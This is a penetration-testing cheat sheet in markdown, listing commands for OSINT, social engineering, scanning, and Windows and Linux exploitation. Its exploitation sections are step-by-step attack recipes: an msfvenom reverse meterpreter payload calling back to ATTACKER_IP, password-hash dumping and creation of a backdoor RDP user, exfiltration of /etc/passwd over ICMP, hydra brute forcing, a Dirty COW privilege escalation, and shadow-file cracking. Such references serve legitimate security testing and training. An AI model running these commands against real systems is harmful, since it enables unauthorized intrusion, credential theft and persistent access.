- [OSINT](#osint)
  - [Subdomain Enumeration](#subdomain-enumeration)
  - [Similar Domains](#similar-domains)
  - [Search](#search)
  - [Geo-location](#geo-location)
  - [Data Harvesting](#data-harvesting)
  - [People Search](#people-search)
  - [Archive](#archive)
  - [whois](#whois)
  - [DNS](#dns)
  - [Network Drawing](#network-drawing)
  - [Other OSINT Helper Tools](#other-osint-helper-tools)
  - [Reporting](#reporting)
- [Social Engineering](#social-engineering)
  - [Email](#email)
  - [Phone](#phone)
  - [Physical Vectors](#physical-vectors)
  - [Phishing Vendors](#phishing-vendors)
  - [Reporting](#reporting-1)
- [External Network Pentesting](#external-network-pentesting)
  - [Network Pentest Process](#network-pentest-process)
  - [Scans](#scans)
      - [Web Scans](#web-scans)
    - [OS Fingerprinting](#os-fingerprinting)
    - [Send Files Using ICMP](#send-files-using-icmp)
    - [Convert XML nmap output to HTML](#convert-xml-nmap-output-to-html)
    - [Target Database](#target-database)
  - [Vulnerability Research](#vulnerability-research)
    - [Example: SMB Enumeration](#example-smb-enumeration)
    - [Example: RPC and NFS shares](#example-rpc-and-nfs-shares)
  - [Example: Enumerating Logged on Users Using Finger Protocol](#example-enumerating-logged-on-users-using-finger-protocol)
    - [Metasploit db\_nmap](#metasploit-db_nmap)
  - [ARP Poisoning, MITM, Password Sniffing](#arp-poisoning-mitm-password-sniffing)
    - [Weak Passwords Check Using L0phtCrack](#weak-passwords-check-using-l0phtcrack)
    - [FTP Dictionary Attack](#ftp-dictionary-attack)
    - [Tools](#tools)
  - [Windows Exploitation Example](#windows-exploitation-example)
  - [Linux Exploitation Example](#linux-exploitation-example)
- [Internal Network Pentesting](#internal-network-pentesting)
  - [Footprint](#footprint)
  - [Internal Network Mapping](#internal-network-mapping)
- [Cool Paid Industry Tools](#cool-paid-industry-tools)

# OSINT

The whole [framework](https://osintframework.com/).

## Subdomain Enumeration

- [SubBrute](https://github.com/TheRook/subbrute): `subbrute.py example.com`
- `nmap --script dns-brute example.com`
- `dnsmap example.com`
- `fierce -dns example.com`
- `python3 sublist3r.py -d example.com -p 80 -e Bing`

## Similar Domains

- [urlcrazy](https://github.com/urbanadventurer/urlcrazy): `urlcrazy -p example.com`

## Search

- `allintitle:` restricts the results to those pages containing all the query terms specified in the title
- `allintext:` searches pages with content specified in search criteria - inurl: restricts the results to those pages containing the word specified in the URL - allinurl: restricts the results to those pages containing all the query terms specified in the URL
- `link:` searches websites or pages that contain links to the specified website or page - info: finds information for the specified web page - related: displays websites that are similar or related to the specified URL - cache: displays Google’s cached version of a web page, instead of the current version of the web page
- `location:` finds information for a specific location - define: finds definitions of words, phrases, and acronyms - filetype: allows searching based on a file extension - id: an undocumented alias for info - inanchor: restricts results to those pages containing the query terms specified in the anchor text on links to the page
- `allinanchor:` restricts results to those pages containing all query terms specified in the anchor text on links to the page
- `author:` restricts Google Groups results to include newsgroup articles by the specified author; the author can be a full or partial name or email address
- `group:` restricts Google Groups results to newsgroup articles from certain groups or subareas
- `insubject:` restricts articles in Google Groups to those that contain the specified terms - intext: restricts results to documents containing the term in the text - source: restricts results to articles from the news source with the specified ID

## Geo-location

- `nmap -sn --script ip-geolocation-* example.com`

## Data Harvesting

- Gathering info on employees: `theharvester -d example.com -l 500 -b google (linkedin) -h result.html`
- Searching for doc and pdf files: `metagoofil.py -d example.com -t doc,docx,pdf,xlsx,xls,ppt,pptx -l 100 -n 10 -o output -f result.html`
- phishingfrenzy to enumerate search engines for emails
- haveibeenpwned
- pastebin

## People Search

- [pipl](https://pipl.com)
- [people finder](https://peoplefinder.com)
- [TruePopleSearch](https://www.truepeoplesearch.com/)
- Check all common social media

## Archive

- [Wayback Machine](https://www.archive.org)

## whois

- `whois example.com`
- `nmap -sn --script whois-* example.com`
- [ARIN](https://www.arin.net) and [RIPE DB](https://apps.db.ripe.net)
- [robtex](https://www.robtex.com/)

## DNS

- `dnsrecon -d example.com`
- `dnsenum -enum example.com`
- `dig example.com` (`+short` for IP)
- `dnsrecon -r 132.32.23.2-132.32.23.5` (reverse lookup on an IP range)
- [Reverse IP/domain check](https://www.yougetsignal.com/)
- DNS zone transfer:
  - `dig ns example.com`
  - `dig @ns1.bluehost.com example.com. axfr`
  - `dnsrecon -t axfr -d example.com`

## Network Drawing

- `traceroute ip`
- `nmap --traceroute --script traceroute-geolocation example.com`
- SmartDraw, Gliffy, etc. to draw the topological map

## Other OSINT Helper Tools

- Maltego
- fsociety (osint, passowrd attacks, wireless testing, exploitation tools, sniffing, spoofing, web hacking, post exploitation)
- pentmenu (recon, dos, extraction)

## Reporting

- domains/subdomains
- location
- employess
- phone numbers, emails
- products/services
- network devices
- website directories
- public IP address block
- DNS records

Identify possible attack surfaces.

# Social Engineering

- Rules of Engagement (RoE)
- Be aware of local laws in the region before conducting SE

## Email

- Phishing
- Spear phishing
- Whaling
- Pharming

## Phone

- Vishing
- SMSishing

## Physical Vectors

- Piggybacking/Tailgating
- Eavesdropping
- Sholder surfing
- Baiting/media dropping
- Dumpster diving
- Reverse social engineering
- Elicitation techniques
- Motivation techniques

## Phishing Vendors

- OhPhish
- BLACKEYE
- ShellPhishing
- Phishing Frenzy
- LUCY
- SET
- SpeedPhish Framework
- Gophish

## Reporting

- Name and employee ID
- Emails and passwords
- SSN
- Addresses, phone numbers
- PII, sensitive info

# External Network Pentesting

- Detect unnecessary open ports
- Firewall bypass testing
- IDS evasion testing
- Testing switching and routing issues

## Network Pentest Process

1. OSINT
2. Port scanning
3. OS and service fingerprinting
4. Vulnerability research
5. Exploit verifitication
6. Reporting

## Scans

- Quick ping scan: `sudo nmap -sn 192.168.0.0/24`
- `sudo netdiscover -i eth0 -p` (passive)
- `sudo netdiscover -i eth0 -r 192.168.0.0/24` (active)
- ICMP ping scan: `nmap -sP IP`
- SYN scan: `nmap -sS -P0 IP`
- All ports SYN scan: `nmap -sS -p- -P0 -max-rtt-timeout <time> IP`
- Specific port SYN scan: `nmap -sS -p80,443 -P0 IP`
- Fragmentation scan: `nmap -sS -A -f IP`
- OS scan: `nmap -O -F IP`
- [Scan for patches](https://uptime.netcraft.com)
- `sudo hping3 --scan known 192.168.0.7 -S` (known ports from `/etc/services`)
- `sudo hping3 --scan '0-3000' 192.168.0.7 -S` (scan a port range)

#### Web Scans

- Website info: `sudo whatweb example.com`
- Wordpress scan: `sudo wpscan --url example.com --enumerate u` (users)
- Wordpress scan: `sudo wpscan --url example.com --enumerate t` (themes)
- Wordpress scan: `sudo wpscan --url example.com --enumerate p` (plugins)
- `msfconsole`:
  - `load wmap`
  - `wmap_sites -a example.com` (add a site)
  - `wmap_targets -t IP_of_the_site` (add a target)
  - `wmap_run -t` (load modules based on the site)
  - `wmap_run -e` (run the assessment)
  - `vulns` (display vulnerabilities)
- Nikto
- Vega

### OS Fingerprinting

- Passive: `sudo p0f -i any -p -o /tmp/sniff.log` (`-p` for promiscuous)
- `sudo nmap -O IP`
- `dmitry -pf IP`
- `dmitry -pb IP` (`b` for banner grab)

### Send Files Using ICMP

For any ASCII file to be sent over the network as ICMP:
1. Listening window on the server: `sudo hping3 0.0.0.0 --listen signature --safe --icmp`
2. On the client to send to the server: `sudo hping3 IP --icmp -d 100 --sign signature --file /etc/passwd`

### Convert XML nmap output to HTML

`xsltproc -o ~/scanresults.html /usr/share/nmap/nmap.xsl scan.xml`

### Target Database

1. Host/IP
2. OS
3. Ports
4. Services
5. Vulnerabilities
6. Exploit
7. Notes
8. Priority

## Vulnerability Research

- Google Hacking DB
- National Vulnerability Database
- [Exploit DB](https://www.exploit-db.com)
- [CVE](https://www.cvedetails.com)
- [Vulmon](https://vulmon.com/)
- `searchsploit -t Windows Server 2008`
- `searchsploit Windows Server 2008 | grep -i local`
- `searchsploit Windows Server 2008 | grep -v kernel`

### Example: SMB Enumeration

- `nmap --script smb-os-discovery IP`
- `nmap -sC IP` (default script scan)
- SMB exploit on Win 7 (eternalblue): 
  - `nmap --script=smb-os-discovery -p 445 IP`
  - Open `msfconsole`: 
    1. `use auxiliary/scanner/smb/smb_ms17_010`
    2. `set rhosts IP`
    3. `set processinject lsass.exe` (optional)
    4. `run`

### Example: RPC and NFS shares

1. `nmaps -T4 -A IP`
2. Focus on RPC, NFS, and mountd services.
3. `rpcinfo -p IP`
4. `showmount -e IP` (discover NFS shares listed in `/etc/exports`)
5. `sudo mount -t nfs 172.19.19.51:/home /mnt -o nolock` (`-t` specifies the type of the file system (nfs). Specifying `nolock` disables the file locking)
6. Try to access and remove files to confirm read/write.

## Example: Enumerating Logged on Users Using Finger Protocol

1. Check if Finger port is opened: `nmap -p 79 192.168.0.50`
2. `finger @192.168.0.50`
3. `finger Admin@192.168.0.50`
4. Alternatively, use telnet: `telnet 192.168.0.50 79` (type the username, e.g. `Admin`)
5. Safeguard: disable Finger service by editing the `finger` text file in /etc/xinetd.d

### Metasploit db_nmap

1. `sudo service postgresql start`
2. `sudo msfdb init`
3. `sudo msfconsole`
4. `workspace -h`
5. Create a workspace `workspace -a LPT`
6. `db_nmap -sP IP`
7. Type `services` or `hosts` to examine the scan results from the workspace
8. `host -h` to check on all available options
9. `use auxiliary/scanner/portscan/tcp`
10. `hosts -c address,os_flavor -S Linux -R` (`-R` inputs the hosts into the aux scanner's RHOSTS)
11. `run`

## ARP Poisoning, MITM, Password Sniffing

1. Open Cain & Abel
2. Configure Ethernet
3. Select Sniffer and pick the Ethernet adapter
4. Start sniffing
5. In the Sniffer tab, Plus (+) icon (or) right click in the window, select Scan MAC Addresses to scan the network for hosts
6. Select ARP (bottom-left corner) after getting the MAC addresses
7. Click (+) to add a new ARP poison route
8. Select two IPs that communicate (like FTP server and Ads Dept)
9. Start ARP
10. Check Passwords tab (bottom-left corner)

### Weak Passwords Check Using L0phtCrack

1. Install L0phtCrack on Windows
2. Run it and extract passwords from weak NTLM hashes

### FTP Dictionary Attack

- `hydra -L /root/Wordlists/Usernames.txt -P /root/Wordlists/Passwords.txt ftp://IP`

### Tools

- OpenVAS for vulnerability scanning
- Searchsploit (`searchsploit openssl remote`)
- Copy metasploit modules:
  - to the appropriate folder, e.g. `usr/share/metasploit-framework/modules/exploits/multi/http`
  - `reload_all` inside of `msfconsole`
  - `search new_exploit_name`
- [Villain](https://github.com/t3l3machus/Villain) a Windows & Linux backdoor generator and multi-session handler that allows users to connect with sibling servers (other machines running Villain) and share their backdoor sessions

## Windows Exploitation Example

1. `msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' lhost=ATTACKER_IP lport=443 -f exe > /home/pentester/Desktop/shikata.exe` (reverse meterpreter shell)
2. `service apache2 start` (for sharing files with remote users)
3. `mkdir /var/www/html/share`
4. `chmod -R 755 /var/www/html/share/`
5. `cp /home/pentester/Desktop/shikata.exe /var/www/html/share`
6. `msfconsole`
7. `use exploit/multi/handler`
8. `set payload windows/meterpreter/reverse_tcp`
9. `set lhost ATTACKER_IP`
10. `set lport 443`
11. `exploit`
12. `getsystem`
13. `run post/windows/gather/hashdump`
14. `run getgui -e` (enables the remote desktop connection to the machine)
15. `run getgui -u POPS -p frasporD@123` (create a user POPS)
16. `xfreerdp /u:POPS /p:frasporD@123 /v:TARGET_IP`

To crack the hashes, use JohnTheRipper (run `export CPUID_DISABLE=1` before using john) or hashcat:
`sudo john --format=nt /home/pentester/Desktop/hashes.txt`

## Linux Exploitation Example

1. Brute force SSH: `hydra -L /home/pentester/Wordlists/Usernames.txt -P /home/pentester/Wordlists/Passwords.txt TARGET_IP ssh`
2. Connect to the target machine, run `uname -a` and `lsb_release -a` to get Linux distro info and version
3. Test if you can switch to root: `sudo su`
4. `searchsploit dirty cow`
5. Copy the exploit to the root folder: `searchsploit -m linux/local/40847.cpp`
6. Copy the contents of the file into a file on the target machine
7. Compile the code: `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`
8. `./dcow -s`
9. `cat /etc/passwd` (save the content into a file for cracking password hashes)
10. `cat /etc/shadow` (save this to another file)
11. `unshadow password.txt shadow.txt > unshadowed.txt`
12. `export CPUID_DISABLE=1`
13. `sudo john unshadowed.txt`

# Internal Network Pentesting

## Footprint

- Identify internal domains: `net view /domain`
- List of files/print shares: `net view \\ computername`
- List of files/print shares including hidden: `net view \\ computername /all`
- List of shares on a Netware PC: `net view /network:nw`
- Find the domain name: `systeminfo | findstr /B /C:"Domain"\`
- Find the logged in user's domain: `echo %userdomain%`
- WMIC to find the domain: `wmic computersystem get domain`
- List all available servers on the domain: `net view /domain: [domain name]`

## Internal Network Mapping

- `arp -a`
- `ipconfig`
- `nmap`
- Soft Perfect Network Scanner
- MyLanViewer
- SolarWinds IP network brows
- Active mode: `netdiscover -r 10.0.0.0/24`
- Passive mode: `netdiscover -p 10.0.0.0/24`
- Bettercap

# Cool Paid Industry Tools

- [Bruteratel](https://bruteratel.com/) a customized C2 for red team and adversary simulation
- [CobaltStrike](https://www.cobaltstrike.com/) adversary simulation and red team operations
